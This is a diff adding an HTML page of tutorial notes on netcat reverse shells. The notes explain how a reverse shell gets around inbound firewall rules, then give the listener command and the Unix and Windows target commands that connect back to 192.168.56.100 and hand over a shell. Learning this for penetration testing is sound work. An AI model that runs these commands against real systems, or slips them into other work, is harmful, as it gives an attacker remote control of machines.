@@ -1,0 +1,26 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>netcat reverse bind</title>
+</head><body>Reverse Shell<br/>
+<br/>
+Reverse Shell <br/>
+One of the drawbacks of “bind shell” is that if the target system – the one we want to control – is behind a firewall, our listening port might be blocked. Let’s even further assume that the firewall is blocking all incoming ports to the target system, and only allowing certain outbound ports. That is, the target system can initial connection to the outside world on certain ports. In this case, we cannot use bind shell. The following diagram illustrates this scenario:<br/>
+&nbsp;<br/>
+<img src="https://www.semurity.com/wp-content/uploads/2017/07/Blog02_img02.png" /><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <img src="image.png" width="550" height="171" /><br/>
+<br/>
+<br/>
+To implement this with Netcat, we need to set a listener on our controlling system. We will use port number 12345 for the sake of this example:<br/>
+&nbsp;<br/>
+<span style="font-family: courier new">netcat –v –l –p 12345</span><br/>
+&nbsp;<br/>
+Then, on the target system, we will issue either of these commands, depending on the OS:<br/>
+&nbsp;<br/>
+<b><span style="font-family: courier new">UNIX/LINUX</span></b><span style="font-family: courier new"># netcat –e /bin/bash 192.168.56.100 12345</span><br/>
+<b><span style="font-family: courier new">Windows</span></b><span style="font-family: courier new">&gt; nc –e cmd.exe 192.168.56.100 12345</span><br/>
+<br/>
+<br/>
+<br/>
+</body></html>
